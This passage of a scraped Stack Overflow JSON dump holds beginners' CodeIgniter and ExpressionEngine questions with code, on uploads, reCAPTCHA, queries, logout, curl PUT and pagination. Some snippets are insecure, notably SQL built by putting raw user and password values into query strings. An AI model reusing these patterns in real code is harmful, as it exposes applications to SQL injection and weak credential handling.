mkdir($thumb_upload_folder, DIR_WRITE_MODE, true);\n        }\n\n        $img = $this-&gt;upload-&gt;data();\n        // create thumbnail\n        $new_image = $thumb_upload_folder . '/thumb_' . $img['file_name'];\n\n        $c_img_lib = array('image_library' =&gt; 'gd2', 'source_image' =&gt; $img['full_path'], 'maintain_ratio' =&gt; TRUE, 'width' =&gt; 120, 'height' =&gt; 120, 'new_image' =&gt; $new_image);\n\n        $this-&gt;load-&gt;library('image_lib', $c_img_lib);\n        $this-&gt;image_lib-&gt;resize();\n\n        $file_info = $this-&gt;upload-&gt;data();\n        echo json_encode($file_info);\n\n        $root_path = str_replace(\"\\\\\", \"/\", FCPATH);\n        $path = str_replace($root_path, \"\", $file_info['file_path']);\n        $url = $path . $file_info['file_name'];\n        $thumb_url = $path . 'thumb/thumb_' . $file_info['file_name'];\n\n        $this-&gt;load-&gt;database();\n\n        $query = array('url' =&gt; $url, 'thumb_url' =&gt; $thumb_url, 'gallery_id' =&gt; $gallery_id);\n        $this-&gt;db-&gt;insert('images', $query);\n\n        $inserted_id = $this-&gt;db-&gt;insert_id();\n        $query2 = array('order' =&gt; $inserted_id);\n\n        $this-&gt;db-&gt;where('id', $inserted_id);\n        $this-&gt;db-&gt;update('images', $query2);\n    }\n}\n</code></pre>\n\n<p>javascript in view file:</p>\n\n<pre><code>        &lt;script type=\"text/javascript\"&gt;\n        $(document).ready(function () {\n\n            var base_url = '&lt;?php echo base_url(); ?&gt;';\n\n            $('#upload-file').click(function (e) {\n                e.preventDefault();\n                $('#userfile').uploadify('upload', '*');\n            });\n            $('#userfile').uploadify({\n\n                'debug':true,\n                'auto':true,\n                'swf': base_url + 'assets/js/jquery/uploadify_31/uploadify.swf',\n                'uploader': base_url + 'glenn-admin/image_gallery/do_upload',\n                'cancelImg': base_url + 'assets/javascript/jquery/uploadify_31/uploadify-cancel.png',\n                'fileTypeExts':'*.jpg;*.bmp;*.png;*.tif',\n                'fileTypeDesc':'Image Files (.jpg,.bmp,.png,.tif)',\n                'fileSizeLimit':'2MB',\n                'fileObjName':'userfile',\n                'buttonText':'Upload Photos',\n                'multi':true,\n                'removeCompleted':true,\n                'method': 'post',\n                'formData': {'galleryTitle': '&lt;?php echo $gallery_title ?&gt;', 'galleryID': '&lt;?php echo $gallery_id ?&gt;'},\n                'onUploadError' : function(file, errorCode, errorMsg, errorString) {\n                    alert('The file ' + file.name + ' could not be uploaded: ' + errorString);\n                },\n                'queueID'  : 'image-queue',\n                'onUploadProgress' : function(file, bytesUploaded, bytesTotal, totalBytesUploaded, totalBytesTotal) {\n                    $('#progressbar').progressbar({\n                        value: (totalBytesUploaded/totalBytesTotal)*100\n                    });},\n            });\n&lt;/script&gt;\n</code></pre>\n\n<p>This really gives me a hard time. Really appreciate if anyone has a solution for this.\nPS:</p>\n\n<p>Ohkay, I've just realized the problem lies within the Authentication Library that I'm using which is AG_auth.  It requires the controller to extends Application instead of CI_Controller, and when I remove it and extend the controller back to CI_Controller, it works on IE. But this is really not secured. So the problem is why doesnt it work with IE when i use extend Aplication but works on chrome and firefox?</p>\n"},{"tags":["php","codeigniter","recaptcha"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13125927,"title":"\"incorrect-captcha-sol\" Error when using recaptcha","body":"<p>I can't figure out why my recaptcha isn't working with codeigniter.  I keep getting the \"incorrect-captcha-sol\" error message when I enter the correct recaptcha text.</p>\n\n<p>View:</p>\n\n<pre><code>&lt;?php\nrequire_once('/home/orion/public/elaborwrit.com/public/application/views/recaptchalib.php');\n$publickey = \"xxx\";\necho recaptcha_get_html($publickey);\n?&gt;\n</code></pre>\n\n<p>Controller:</p>\n\n<pre><code>//reCaptcha verification\n        require_once('/home/orion/public/elaborwrit.com/public/application/views/recaptchalib.php');\n\n        $privatekey = \"xxx\";\n        $resp = recaptcha_check_answer ($privatekey,\n                                        $_SERVER['REMOTE_ADDR'],\n                                        $_POST[\"recaptcha_challenge_field\"],\n                                        $_POST[\"recaptcha_response_field\"]);\n\n        if (!$resp-&gt;is_valid) {\n        // What happens when the CAPTCHA was entered incorrectly\n\n            $data['recaptcha_error'] = \"The reCAPTCHA wasn't entered correctly.&lt;br/&gt;&lt;br/&gt;\" . \"(reCAPTCHA said: \" . $resp-&gt;error . ')';\n            $this-&gt;load-&gt;view('header', $data);\n            $this-&gt;load-&gt;view('register_view', $data);\n            $this-&gt;load-&gt;view('footer', $data);\n        } \n        else \n        {\n            // Your code here to handle a successful verification\n</code></pre>\n"},{"tags":["php","codeigniter","expressionengine"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":80,"score":1,"question_id":13123245,"title":"Expression Engine: Matching Users to Member Groups","body":"<p>Hi I am currently writing a few functions for various hooks such as </p>\n\n<ul>\n<li><a href=\"http://expressionengine.com/user_guide/modules/safecracker/development.html#safecracker-submit-entry-end\" rel=\"nofollow\">safecracker_submit_entry_end</a> </li>\n<li><a href=\"http://expressionengine.com/user_guide/development/extension_hooks/api/channel_entries/index.html#entry-submission-ready\" rel=\"nofollow\">entry_submission_ready</a></li>\n</ul>\n\n<p>and I need to work out what member group the current user belongs to. So far to get the extension up and running I have been writing IF statements with hard coded ids like so</p>\n\n<p><strong>CODE EXAMPLE:</strong></p>\n\n<pre><code>if($this-&gt;EE-&gt;session-&gt;userdata('group_id') == 5){ //do something } \n</code></pre>\n\n<p>Is there a standard way to match users to member groups?</p>\n"},{"tags":["php","codeigniter"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":3880,"score":0,"question_id":3832638,"title":"Code Igniter / PHP - Undefined index? Easy points for someone","body":"<p>This is probably obvious but I'm getting this error:</p>\n\n<pre><code>A PHP Error was encountered\n\nSeverity: Notice\n\nMessage: Undefined index: outputcards\n\nFilename: controllers/site.php\n\nLine Number: 49\n</code></pre>\n\n<p>Here's the line in question:</p>\n\n<pre><code>$out['outputcards'] .= $this-&gt;load-&gt;view('client_view_data',$data, TRUE);\n</code></pre>\n\n<p>which is inside a for loop, and being used in the view as echo $outputcards.</p>\n\n<p>All works fine, but the error is there at the top.</p>\n\n<p>Any ideas?</p>\n\n<p>Thank you!</p>\n"},{"tags":["codeigniter","cakephp"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":68,"score":1,"question_id":13102414,"title":"Stuck with CakePHP project","body":"<p>I'm currently sitting on a project which is built in CakePHP by a developer I've never met and which isn't working on the project any longer. Our company wants a lot of nice new features on the project, and I don't feel too eager to create these features since I find CakePHP more unlogical to work with than Codeigniter, and I would prefer to do all my projects in CodeIgniter. The though has struck my mind to basicly rebuild our project in CodeIgniter, but that would of course mean an investment of time. </p>\n\n<p>So basicly what would be the best approach? The project is rather but not too big. I could try to upgrade CakePHP 1.3 to 2.0 and see if it's more logical and try to feel good in CakePHP. It just feels like CodeIgniter syncs better with my brain. I'm a sole developer on this project and no one else who cares what framework I'm using.</p>\n\n<p>Feel free to refer to own project decisions and results. If you feel that this question belongs at the programmers site, please move it.</p>\n"},{"tags":["codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":51,"score":-1,"question_id":13109969,"title":"Codeigniter get row","body":"<p>I use codeigniter for my website, but I have a problem I have done script who returns rows from different tables. But it write me error <strong>Trying to get property of non-object</strong>. This is my code. Where is a problem?</p>\n\n<pre><code>      $this-&gt;db-&gt;select('*');\n      $this-&gt;db-&gt;from('orders');\n      $this-&gt;db-&gt;where('order_id',$order_id);\n      $array_keys_values = $this-&gt;db-&gt;get();\n      $row = $array_keys_values-&gt;row();\n\n      $this-&gt;db-&gt;select('*');\n      $this-&gt;db-&gt;from('pacients');\n      $this-&gt;db-&gt;where('pacient_account_id',$row-&gt;order_pacient_id);\n      $array_keys_values2 = $this-&gt;db-&gt;get();\n      $row2 = $array_keys_values2-&gt;row();\n\n      $this-&gt;db-&gt;select('*');\n      $this-&gt;db-&gt;from('doctors');\n      $this-&gt;db-&gt;where('doctor_account_id',$doctor_id);\n      $array_keys_values3 = $this-&gt;db-&gt;get();\n      $row3 = $array_keys_values3-&gt;row();\n</code></pre>\n"},{"tags":["php","codeigniter","chat"],"answer_count":2,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":1913,"score":1,"question_id":6688735,"title":"Codeigniter Chat","body":"<p>I am looking codeigniter chat script.</p>\n\n<p>I expect like <a href=\"http://anantgarg.com/chat/sampleb.php\" rel=\"nofollow\">http://anantgarg.com/chat/sampleb.php</a>.</p>\n\n<p>Have anyone know any script for codeigniter chat?</p>\n"},{"tags":["php","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":13114064,"title":"PHPUnit and CodeIgniter - Fatal error: Class 'CIUnit_TestCase' not found","body":"<p>I currently have a set up where on my local pc I have a CodeIgniter website, with CIUnit and phpunit installed for Unit Testing. Everything works fine here.  I can go into the tests dir and type phpunit and all the unit tests run like normal. yay</p>\n\n<p>Today I set up a buildserver and installed Hudson and phpunit and created a build file and everything for it to run.  The build fails because the unit tests break everything. I try to go to the tests dir /var/lib/hudson/jobs/website/workspace/tests and type phpunit and I get the following error:</p>\n\n<pre><code>Fatal error: Class 'CIUnit_TestCase' not found in /var/lib/hudson/jobs/website/workspace/tests/controllers/CI_Unit_Test_class_Test.php on line 8\n</code></pre>\n\n<p>I know there isn't an issue with the code being different because it is pulled in during the build from a git repo.  I can't for the life of me figure out why it works locally but not on the build server.  </p>\n\n<p>Both machines are running Ubuntu 12.04</p>\n\n<p>Can anyone please give me some advice or insight on what to check?  I would greatly appreciate it.</p>\n"},{"tags":["php","javascript","jquery","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":13122098,"title":"Repopulating dynamicly populated selects with jquery","body":"<p>Ok so now my problem is that when i submit the values are not being populated again if the validation fails </p>\n\n<pre><code>$(\"#depot_province\").live('change',function() {\n  var sel_prov = $(this).attr('value'); \n  //The Ajax call to select the provinces\n  $.ajax({\n    url: base_url+\"cities_ajax_call\",\n    async: false,\n    type: \"POST\",\n    data: {province:sel_prov},\n    dataType: \"json\",\n    //Gets called when successfull\n    success: function(data){\n      if (typeof data===\"object\" &amp;&amp; !data.errors){\n        var citySelect = $('select#depot_city');\n          if(data.cities&amp;&amp;data.cities.length&gt;0){\n            citySelect.empty();\n            for(i=0, len=data.cities.length;i&lt;len;i++){\n              citySelect.append('&lt;option value=\"'+data.cities[i].city_name+'\"&gt;'+data.cities[i].city_name+'&lt;/option&gt;');}\n            citySelect.val(data.cities[0].city_name).change();  \n          } \n      } \n      else\n      {\n        return;\n      }\n    }\n  })\n});\n</code></pre>\n\n<p>thats the view script here is the select</p>\n\n<pre><code>&lt;div class=\"control-group\"&gt;\n  &lt;label class=\"control-label\" for=\"depot_city\"&gt;Depot City&lt;/label&gt;\n  &lt;div class=\"controls\"&gt;\n    &lt;select class=\"span4\" id=\"depot_city\" name=\"depot_city\"&gt;\n      &lt;?php echo (isset($depot_city) ? \"&lt;option&gt;$depot_city&lt;/option&gt;\" : '' ); ?&gt;\n      &lt;option&gt;Please Select a Province...&lt;/option&gt;\n    &lt;/select&gt;\n  &lt;/div&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p>and then finally here is the controller call </p>\n\n<pre><code>public function cities_ajax_call()\n{\n  if (is_signed_in() == TRUE)\n  {\n    $province       = $_POST['province'];\n    if(!$province)\n    {\n      $this-&gt;output-&gt;set_output(json_encode(array('errors'=&gt;true)));\n      return;\n    }\n    //Gets the ID from the database\n    $province_id    = $this-&gt;location_model-&gt;get_province_id($province);\n    //Gets all citys form database\n    $cities         = $this-&gt;location_model-&gt;get_citys_by_province($province_id[0]-&gt;province_id);\n\n    $this-&gt;output-&gt;set_output(json_encode(array('success'=&gt;true, 'cities'=&gt;$cities)));\n  } else {\n    redirect('home/login_form/?continue=' . urlencode(base_url()));\n  }\n</code></pre>\n\n<p>Any advice would be greatly appreciated. </p>\n"},{"tags":["sql","arrays","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":92,"score":0,"question_id":13115694,"title":"insert array into database codeigniter","body":"<p>i have tried to make sql code in CI, the problem is the <code>ID_LABEL</code> at t_publisher is filled with 0 where it should filled with number that taken from t_label..</p>\n\n<pre><code>$sql['query1'] = \"INSERT into t_user (USER_NAME, USER_PASS, USER_STATUS, USER_TYPE) values ('$user', '$pass','1','publisher')\";\n$sql['query2'] = \"INSERT INTO t_label (LABEL) values('$user')\";\n$id_label = \"select id_label from t_label where label ='\".$user.\"'\";\n$id = $this-&gt;db-&gt;query($id_label)-&gt;result();\n$sql['query3'] = \"INSERT INTO t_publisher (PUBLISHER, ARTIS, ID_LABEL) values('$user', 'Various Artist', '$id')\";\n$result = array();\nforeach($sql as $key =&gt; $value){\n\n$result[$key] = $this-&gt;db-&gt;query($value);\n}\n</code></pre>\n\n<p>please help :)</p>\n"},{"tags":["php",".htaccess","codeigniter","permissions"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":391,"score":1,"question_id":7928947,"title":"Prevent direct access to a file, allow google doc viewer","body":"<p>I have a folder with pdf files and I want to prevent direct access but allow google doc viewer to display the file.</p>\n\n<p>I tried .htaccess, changing linux permissions and nothing worked fine (Direct access is forbidden but I get this when viewing with doc viewer: Sorry, we are unable to retrieve the document for viewing or you don't have permission to view the document)</p>\n\n<p>Anyone done this before? Thanks!</p>\n"},{"tags":["php","codeigniter","expressionengine"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":87,"score":4,"question_id":13119828,"title":"ExpressionEngine no_results not working","body":"<p>Hi I have the following code:</p>\n\n<pre><code>&lt;div class=\"row-fluid\"&gt;\n    &lt;div class=\"span12\"&gt;\n        &lt;h3&gt;Top 10 most popular&lt;/h3&gt;\n        &lt;ul&gt;\n            {exp:channel:entries channel=\"faqs\" dynamic=\"no\" limit=\"10\"}\n                &lt;li&gt;&lt;a href=\"{url_title_path='help'}\"&gt;{title}&lt;/a&gt;&lt;/li&gt;\n            {/exp:channel:entries} \n        &lt;/ul&gt;\n\n        &lt;h3&gt;Answer to selected question&lt;/h3&gt;\n        {exp:channel:entries channel=\"faqs\" dynamic=\"yes\" require_entry=\"yes\" limit=\"1\"}\n             {if no_results} \n                &lt;p&gt;Click a question above to see the answer here&lt;/p&gt;\n             {/if}\n            {answer}\n        {/exp:channel:entries} \n    &lt;/div&gt;    \n&lt;/div&gt;\n</code></pre>\n\n<p>So as you can see I am looping through faqs twice. The first set it to get all of the questions and then if a user clicks on a question thats when the second loop should kick in to show them the answer. This works fine apart from the no results statement in the second loop doesn't work. It just never gets output. Anyone know why?</p>\n"},{"tags":["codeigniter","exception-handling"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":144,"score":0,"question_id":11176815,"title":"set_exception_handler in codeigniter - how to use?","body":"<p>I have a code similar to the following which is not working.</p>\n\n<pre><code>class Abc extends CI_Controller {\n\n    static function exception_handler(Exception $ex)\n    {       \n        var_dump($ex);\n        echo $ex-&gt;getMessage();\n        exit;\n    }\n\n    function __construct()\n    {\n        parent::__construct();\n        set_exception_handler('exception_handler');     \n    }       \n\n    function Index()\n    {\n\n        throw new Exception('hehe');\n    }\n}   \n</code></pre>\n\n<p>I get </p>\n\n<blockquote>\n  <p>A PHP Error was encountered</p>\n  \n  <p>Severity: Warning</p>\n  \n  <p>Message: set_exception_handler() expects the argument\n  (exception_handler) to be a valid callback</p>\n</blockquote>\n\n<p>How to use set_exception_handler in codeigniter</p>\n"},{"tags":["html","codeigniter","quotes"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12509863,"title":"Random quote in HTML using CodeIgniter","body":"<p>I am getting random quotes in my HTML (see image below), and I can't for the life of me figure out how to get rid of them. I have traced it right back to my model and there are now quotes there. I have also compressed all my code and there are still quotes.</p>\n\n<p><img src=\"http://i.stack.imgur.com/oyQxS.png\" alt=\"enter image description here\"></p>\n\n<p>Any one had this bug???</p>\n\n<p>Here's my PHP code</p>\n\n<pre><code>&lt;ul&gt;&lt;?php foreach ($account_media as $value) : ?&gt;&lt;li class=\"span2\"&gt;&lt;/li&gt;​&lt;?php endforeach; ?&gt;&lt;/ul&gt;\n</code></pre>\n\n<p>I am using CodeIgniter</p>\n\n<p><img src=\"http://i.stack.imgur.com/jGAyj.png\" alt=\"enter image description here\"></p>\n\n<p>UPDATE: ok this is from a while ago but thought i would update you all with my solution. DO NOT COPY AND PASTE FROM JSFIDDLE really hard to debug (paste code into text editor save as plain text and then delete the old code and replace with plain text version)</p>\n"},{"tags":["codeigniter","codeigniter-datamapper"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":20,"score":2,"question_id":13118677,"title":"Codeigniter Datamapper - Add tablename by __construct","body":"<p>In my CMS I want to add modules by creating a table in the database. But Codeigniter with datamappers has one mandatory rule: give the tablename in your code. I have create a Datamapper model as following:</p>\n\n<pre><code>class Module_universeel extends DataMapper {\n\n    public $table = 'module_universeel';\n    public $has_one = array('page');\n\n    public function __construct($module_table=null) {\n\n        parent::__construct();\n        if(isset($module_table)) $this-&gt;table = $module_table;\n\n    }\n}\n</code></pre>\n\n<p>This works when I create a table with the name: 'module_universeel'. When I change the tablename into 'module_news' or something, it works. But it doesn't change the structure ($this->fields) of my datamapper. </p>\n\n<p>How can I do this? Does anybody have experience with this?</p>\n"},{"tags":["codeigniter","get"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13119161,"title":"Codeigniter GET parameters not passing via url","body":"<p>I am trying to implement the logout procedure for my website.\nWhen the user clicks the sign out button I redirect him to the following <code>home</code> controller script.</p>\n\n<pre><code>http : // mydomain/php/ci/index.php/index/?logout=set\n</code></pre>\n\n<p>And in my home controller <code>index</code> function I check if logout=set then destroy all sessions.</p>\n\n<pre><code>    echo @$_GET['logout'];\n    exit();\n    if(@$_GET['logout'] == \"set\")\n    {\n        unset($_SESSION['userid']);\n        @$_SESSION = array();\n        @session_unset();\n        @session_destroy();\n    }\n</code></pre>\n\n<p>But when I reach here nothing gets printed because the logout param is not passing.\nI see the following url when i get here on clicking the sign out button.</p>\n\n<pre><code>http://localhost/php/ci/home/\n</code></pre>\n\n<p>Why is this happening?</p>\n"},{"tags":["php","codeigniter","rest","curl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":429,"score":1,"question_id":8837164,"title":"curl 403 forbidden","body":"<p>I am getting a 'You don't have permission to access /rest/02/put.php on this server.' message while using following.</p>\n\n<p>This is put-service-consumer.php</p>\n\n<pre><code>&lt;?php\n$url = 'http://127.0.0.1/rest/02/put.php';\n$fh = fopen('data.txt', 'r');\n$data = file_get_contents('data.txt');\n$ch = curl_init();\ncurl_setopt($ch, CURLOPT_URL, $url);\ncurl_setopt($ch, CURLOPT_INFILE, $fh);\ncurl_setopt($ch, CURLOPT_INFILESIZE, strlen($data));\ncurl_setopt($ch, CURLOPT_PUT, true);\ncurl_exec($ch);\ncurl_close($ch);\n?&gt;\n</code></pre>\n\n<p>This is put-service.php</p>\n\n<pre><code>&lt;?php\n$putdata = fopen(\"php://input\", \"r\");\necho $putdata.\"here\";\n$fp = fopen(\"put_data_file.txt\", \"a\");\nwhile ($data = fread($putdata, 1024))\n  fwrite($fp, $data);\nfclose($fp);\nfclose($putdata);\n?&gt; \n</code></pre>\n\n<p>This is an example from restful php webservice book. While examples for get and post works, examples for delete and put isn't working.\nThanks for any help in advance. </p>\n"},{"tags":["php","codeigniter","expressionengine"],"answer_count":5,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":127,"score":4,"question_id":13014024,"title":"ExpressionEngine: Single entry template","body":"<p>I have created a channel called credit cards. So I have created a template group called credit-cards with an index which loops through all the credit cards and output them. This aspect works fine, here is my code for the index.html file inside credit-cards.group folder:</p>\n\n<pre><code>         {exp:channel:categories category_group=\"1\" style=\"linear\" dynamic=\"no\"}\n                    &lt;div class=\"card-list tab\" id=\"{category_url_title}\"&gt;\n                        &lt;h2 class=\"category-title\"&gt;{category_name} Credit Cards&lt;/h2&gt;\n                        &lt;div class=\"cards\"&gt;\n                            {exp:channel:entries channel=\"credit_cards\" category=\"{category_id}\" dynamic=\"no\"}\n                                &lt;article&gt;\n                                    &lt;h4&gt;&lt;a href=\"{url_title_path='credit-cards'}\"&gt;{title}&lt;/a&gt;&lt;span class=\"web-exclusive\"&gt;MBNA Website Exclusive&lt;/span&gt;&lt;/h4&gt;\n                                    &lt;ul&gt;\n                                        &lt;li class=\"col-img\"&gt;\n                                            &lt;a href=\"{url_title_path='credit-cards'}\"&gt;&lt;img width=\"116\" height=\"84\" alt=\"MBNA Platinum Credit Card\" src=\"../lib-ui/img/cards/core/core_116x84/mbna_platinum_card_116x84.png\"&gt;&lt;/a&gt;\n                                        &lt;/li&gt;\n                                        &lt;li class=\"col-bt\"&gt;{balance_transfer_rate}&lt;/li&gt;\n                                        &lt;li class=\"col-purchases\"&gt;{purchases_rate}&lt;/li&gt;\n                                        &lt;li class=\"col-features\"&gt;{key_features}&lt;/li&gt;\n                                        &lt;li class=\"col-apply\"&gt;\n                                            &lt;a rel=\"blank\" class=\"btn btn-success\" href=\"{apply_url}\"&gt;\n                                                Apply Now&lt;span class=\"hide\"&gt; for the {title}&lt;/span&gt;\n                                            &lt;/a&gt;\n                                            &lt;a class=\"cta\" href=\"{url_title_path='credit-cards'}\"&gt;\n                                                Learn more&lt;span class=\"hide\"&gt; about the {title}&lt;/span&gt;\n                                            &lt;/a&gt;\n                                            &lt;label class=\"mbna-credit-card checkbox\" for=\"compare_1\"&gt;\n                                                &lt;span tabindex=\"0\"&gt;\n                                                    &lt;input type=\"checkbox\" value=\"mbna-credit-card\" id=\"compare_1\"&gt;\n                                                &lt;/span&gt;\n                                                &lt;span class=\"hide\"&gt; Add the {title} to &lt;/span&gt;Compare\n                                            &lt;/label&gt;\n                                        &lt;/li&gt;\n                                    &lt;/ul&gt;\n                                    &lt;p class=\"rep-ex\"&gt;{representative_example}&lt;/p&gt;\n                                &lt;/article&gt;  \n                            {/exp:channel:entries} \n                        &lt;/div&gt;\n                    &lt;/div&gt;\n                {/exp:channel:categories}\n</code></pre>\n\n<p>So my question is this. Say I have a credit card called visa credit card, the url that is being generated for it is /credit-cards/visa-credit-card. When I click this link though I just get my index page again. I have created another template file inside my group called single.html that has the code to output a single credit card. This looks like so:</p>\n\n<pre><code>&lt;h1&gt;Credit Card Page&lt;/h1&gt;\n{exp:channel:entries channel=\"credit_cards\" limit=\"1\"}\n{if no_results}\n{redirect=\"404\"}\n{/if}\n</code></pre>\n\n<p>So how do I get it to use this template file instead for a single entry?</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":13117351,"title":"Unknown column ' IS NULL LIMIT 15' in 'where clause'","body":"<p>I am getting an database error i.e <code>Error Number: 1054</code></p>\n\n<p>Unknown column <code>' IS NULL LIMIT 15'</code> in 'where clause'\n<code>SELECT * FROM (categories) WHERE IS NULL LIMIT 15</code></p>\n\n<pre><code>function categories()\n{   \n\n    $this-&gt;suri=3;\n    $this-&gt;surl=site_url('variables/categories/');\n    $this-&gt;load-&gt;library('pagination');\n    $cond = array(\n                'parent_id' =&gt; '0'\n                );\n    $config['base_url'] = $this-&gt;surl;\n    $config['total_rows'] = $this-&gt;commonmodel-&gt;getcountcond('categories',$cond);\n    $config['per_page'] = '15';\n    $config['first_link'] = 'First';\n    $config['last_link'] = 'Last';\n    $config['cur_tag_open'] = '&lt;span&gt;';\n    $config['cur_tag_close'] = '&lt;/span&gt;';\n    $config['uri_segment'] = $this-&gt;suri; \n    $this-&gt;pagination-&gt;initialize($config);\n    $parent_cond = array(\n                'parent_id' =&gt; '0'\n                 );\n</code></pre>\n"},{"tags":["codeigniter","grocery-crud"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13078667,"title":"GroceryCRUD - ordering the fields list (not ordering the actual data, just the order of the fields)","body":"<p>In GroceryCRUD i am getting the data from a table with these fields (as they appear in order in MYSQL)</p>\n\n<pre><code>id,\ndate_added,\nviews,\nouthits,\nclicks,\ntitle,\ndescription\n</code></pre>\n\n<p>and i want title + description to be at the top of the form when entering new rows or editing rows. how can this be done?</p>\n"},{"tags":["php","codeigniter","error-handling"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":1694,"score":3,"question_id":7017810,"title":"PHP and Codeigniter - How do you check if a model exists and/or not throw an error?","body":"<h2>Example #1</h2>\n\n<p><code>bschaeffer's</code>answer to <a href=\"http://stackoverflow.com/questions/2719876/access-model-from-view-in-codeigniter\">this</a> question - in his last example:</p>\n\n<pre><code>$this-&gt;load-&gt;model('table');\n$data = $this-&gt;table-&gt;some_func();\n$this-&gt;load-&gt;view('view', $data);\n</code></pre>\n\n<p>How do you handle this when <code>'table'</code> doesn't exist?</p>\n\n<hr>\n\n<h2>Example #2</h2>\n\n<pre><code>    try {\n        $this-&gt;load-&gt;model('serve_' . $model_name, 'my_model');\n        $this-&gt;my_model-&gt;my_fcn($prams);\n\n        // Model Exists\n\n    } catch (Exception $e) {\n        // Model does NOT Exist\n    }\n</code></pre>\n\n<p>But still after running this (obvously the model doesn't exist - but sometimes will) it fails with the following error:</p>\n\n<blockquote>\n  <p><strong>An Error Was Encountered</strong></p>\n  \n  <p>Unable to locate the model you have specified: serve_forms</p>\n</blockquote>\n\n<hr>\n\n<p>I am getting this function call by:</p>\n\n<p>1) Getting some JSON:</p>\n\n<blockquote>\n<pre><code>\"model_1:{\"function_name:{\"pram_1\":\"1\", \"pram_2\":\"1\"}}\n</code></pre>\n</blockquote>\n\n<p>2) And turning it into the function call:</p>\n\n<blockquote>\n  <p>$this->load->model('serve_' . \"model_1\", 'my_model');</p>\n</blockquote>\n\n<p>3) Where I call:</p>\n\n<blockquote>\n<pre><code>$this-&gt;my_model-&gt;function_name(pram_1=1, pram_2=1);\n</code></pre>\n</blockquote>\n\n<hr>\n\n<h2>SOLUTION</h2>\n\n<p>The problem lies in the fact that CodeIgniter's <code>show_error(...)</code> function displays the error then <code>exit;</code> ... Not cool ... So I overrode: <code>model(...)</code> -> <code>my_model(..)</code> (you'll get errors if you just override it) and removed the <code>show_error(...)</code> because for some reason you can't override it - weird for Codeigniter). Then in <code>my_model(...)</code> made it throw an Exception</p>\n\n<blockquote>\n  <p><strong>My personal opinion:</strong> the calling function should <code>return\n  show_error(\"message\");</code> where show_error returns <code>FALSE</code> --- that or\n  you could take out the <code>exit;</code> - and make <code>show_error(...)</code>\n  overridable</p>\n</blockquote>\n"},{"tags":["codeigniter","form-validation"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":35,"score":3,"question_id":13109096,"title":"Codeigniter callback function not working","body":"<p>I am facing this problem from yesterday and can not fix it. My callback function is not working. It's always returning TRUE, but i don't know why? Can anyone help me?</p>\n\n<p>Here is the the model:</p>\n\n<pre><code>class Login_model extends CI_Model {\npublic function check_login($str)\n    {\n        $this-&gt;form_validation-&gt;set_message('check_login', 'Error');\n        return FALSE;\n\n    }\nfunction validate_login()\n{\n    $this-&gt;form_validation-&gt;set_rules('email', 'Email Address', 'trim|required|valid_email|xss_clean');\n    $this-&gt;form_validation-&gt;set_rules('password', 'Password', 'callback_check_login');\n\n    if($this-&gt;form_validation-&gt;run() == FALSE)\n    {\n        return FALSE;\n    }\n\n    return TRUE;\n}}\n</code></pre>\n\n<p>The callback function should never return TRUE. But it's returning! I am going to die with this problem! :@</p>\n"},{"tags":["php","codeigniter","login","tankauth","return-url"],"answer_count":2,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":588,"score":1,"question_id":7417117,"title":"How do I set a return URL during login on Codeigniter / Tank_Auth?","body":"<p>The issue here is that when my user logs into my app, they always are redirected to the default controller.</p>\n\n<p>I would like the user to be redirected to the page they were on before logging in.</p>\n\n<p>So for example, if the user is reading forum post #12 (reading does not require login) and then decides to post an answer (answering requires login), once they login they should go back to post #12.</p>\n\n<p>I am using PHP/Codeigniter 2.0.2 and the Tank_Auth library, and have in several of my controllers</p>\n\n<pre><code>function __construct()\n{\n    parent::__construct();\n\n    if (!$this-&gt;tank_auth-&gt;is_logged_in()) {\n        redirect('/auth/login/');\n    } else {\n\n        //load stuff \n     }\n</code></pre>\n\n<p><em><strong>My question is</em></strong></p>\n\n<p>What is the best way to set a return URL (Cookie? GET?), and how would that be implemented?</p>\n\n<p>If you're familiar with Tank_Auth, in which files should I make these changes?</p>\n\n<p>Any roadmaps are welcome, even if you don't use Tank_Auth.</p>\n\n<p>Thanks a lot.</p>\n"},{"tags":["php","oop","codeigniter","activerecord"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":49,"score":-1,"question_id":13112886,"title":"Return last 100 rows of Codeigniter Active Record query","body":"<p>I am trying to return the last 100 results of a table. Here is what i have so far;</p>\n\n<pre><code>$this-&gt;db-&gt;get('tbl_comchat');\n</code></pre>\n\n<p>And i thought it was something like this after:</p>\n\n<pre><code>$this-&gt;db-&gt;limit('20', 